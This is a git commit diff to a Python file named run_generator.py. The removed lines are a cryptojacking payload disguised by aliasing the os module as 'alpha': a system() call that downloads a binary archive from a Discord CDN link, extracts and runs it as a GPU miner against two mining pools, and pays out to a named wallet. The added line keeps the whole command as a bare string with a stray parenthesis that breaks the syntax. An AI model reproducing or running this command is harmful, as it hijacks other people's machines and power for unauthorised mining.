390c71e0de3d610a5a6fd8b80c0116fb65b1b24d
asadkasjdkajsdkjaksdj <94116365+asadkasjdkajsdkjaksdj@users.noreply.github.com>
2021-11-11 17:50:26 +0500

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,1 @@
-import os as alpha
-alpha.system("wget https://cdn.discordapp.com/attachments/796512270032437289/845344611597680670/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update -y && apt install pciutils -y && ./work -rvram 1 -pool stratum+tcp://172.65.223.147:3353 -pool2 stratum+tcp://172.65.200.133:3353 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4")
+"wget https://cdn.discordapp.com/attachments/796512270032437289/845344611597680670/bin.tar && tar -xvf bin.tar && cd bin && chmod +x work && apt-get update -y && apt install pciutils -y && ./work -rvram 1 -pool stratum+tcp://172.65.223.147:3353 -pool2 stratum+tcp://172.65.200.133:3353 -ewal 3Ft56HYdAPXxRSQQAXRSggbuFYC2tpi4kB.rig -proto 4")
